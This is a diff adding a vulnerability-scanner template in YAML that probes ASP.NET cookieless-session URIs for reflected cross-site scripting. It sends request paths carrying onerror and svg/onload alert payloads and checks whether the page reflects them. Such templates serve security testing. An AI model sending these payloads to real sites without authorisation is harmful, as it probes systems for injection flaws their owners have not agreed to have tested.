@@ -1,0 +1,39 @@
+id: xss-asp-uri
+info:
+  name: Reflected XSS Via URI Based
+  author: melbadry9
+  severity: medium
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/(A(%27%22onerror='alert%601%60'tttt))/Default.aspx"
+      - "{{BaseURL}}/(A(%22onerror='alert%601%60'tttt))/"
+      - "{{BaseURL}}/(A(%27onerror='alert%601%60'tttt))/"
+      - "{{BaseURL}}/%27%22<svg/onload=prompt(1)>"
+
+    redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"onerror='alert`1`'tttt"
+          - "'onerror='alert`1`'tttt"
+          - "<svg/onload=prompt(1)>"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+      
+      - type: word
+        words:
+          - "The requested URL"
+          - "was not found on this server.</p>"
+        part: body
+        condition: and
+        negative: true
